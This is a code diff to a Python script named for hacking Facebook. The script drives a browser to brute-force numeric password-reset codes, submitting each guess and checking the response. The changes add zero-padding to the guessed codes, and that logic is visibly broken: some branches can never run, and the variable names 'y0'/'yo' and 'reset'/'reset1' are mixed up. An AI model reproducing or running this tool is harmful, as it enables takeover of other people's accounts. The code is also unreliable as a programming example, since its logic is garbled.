@@ -45,6 +45,39 @@ def try_password(self, email, password):
         print ('Password found: %s' % password )
         sys.exit()
 
+    if reset1 < 10000000:
+      h = ""
+      code = ("0", str(y))
+      yo = h.join(code)
+    elif reset1 < 1000000:
+      h = ""
+      code = ("00", str(y))
+      yo = h.join(code)
+    elif reset1 < 100000:
+      h = ""
+      code = ("000", str(y))
+      y0 = h.join(code)
+    elif reset1 < 10000:
+      h = ""
+      code = ("0000", str(y))
+      y0 = h.join(code)
+    elif reset1 < 1000:
+      h = ""
+      code = ("00000", str(y))
+      y0 = h.join(code)
+    elif reset1 < 100:
+      h = ""
+      code = ("000000", str(y))
+      y0 = h.join(code)
+    elif reset < 10:
+      h = ""
+      code = ("00000000", str(y))
+      y0 = h.join(code)
+    elif reset < 0:
+      reset = 99999999
+    else:
+      yo = str(reset)
+
 def fb_hack():
   os.system('clear')
   soup = BeautifulSoup()
@@ -90,11 +123,36 @@ def fb_hack():
     while check1 != test or reset > 99999:  
       browser.select_form(nr=0)
       y = reset
-      browser.form['n'] = str(y)
+      if reset1 < 100000:
+        h = ""
+        code = ("0", str(y))
+        yo = h.join(code)
+      elif reset1 < 10000:
+        h = ""
+        code = ("0000", str(y))
+        y0 = h.join(code)
+      elif reset1 < 1000:
+        h = ""
+        code = ("00000", str(y))
+        y0 = h.join(code)
+      elif reset1 < 100:
+        h = ""
+        code = ("000000", str(y))
+        y0 = h.join(code)
+      elif reset < 10:
+        h = ""
+        code = ("00000000", str(y))
+        y0 = h.join(code)
+      elif reset < 0:
+        reset = 999999
+        yo = str(reset)
+      else:
+        yo = str(reset)
+      browser.form['n'] = yo
       browser.submit()
-      print(str(reset), end='\r')
-      fail = (str(y), "failed")
-      success = (str(y), "succeded")
+      print(yo, end='\r')
+      fail = (yo, "failed")
+      success = (yo, "succeded")
       s = " "
       reset = reset-1
       response1 = browser.response()
@@ -109,11 +167,43 @@ def fb_hack():
     while check2 != test or reset > 9999999:
       browser.select_form(nr=0)
       y = reset
-      browser.form['n'] = str(y)
+      if reset1 < 10000000:
+        h = ""
+        code = ("0", str(y))
+        yo = h.join(code)
+      elif reset1 < 1000000:
+        h = ""
+        code = ("00", str(y))
+        yo = h.join(code)
+      elif reset1 < 100000:
+        h = ""
+        code = ("000", str(y))
+        y0 = h.join(code)
+      elif reset1 < 10000:
+        h = ""
+        code = ("0000", str(y))
+        y0 = h.join(code)
+      elif reset1 < 1000:
+        h = ""
+        code = ("00000", str(y))
+        y0 = h.join(code)
+      elif reset1 < 100:
+        h = ""
+        code = ("000000", str(y))
+        y0 = h.join(code)
+      elif reset < 10:
+        h = ""
+        code = ("00000000", str(y))
+        y0 = h.join(code)
+      elif reset < 0:
+        reset = 99999999
+      else:
+        yo = str(reset)
+      browser.form['n'] = yo
       browser.submit()
       print(str(reset), end='\r')
-      fail = (str(y), "failed")
-      success = (str(y), "succeded")
+      fail = (yo, "failed")
+      success = (yo, "succeded")
       s = " "
       reset = reset-1
       response1 = browser.response()
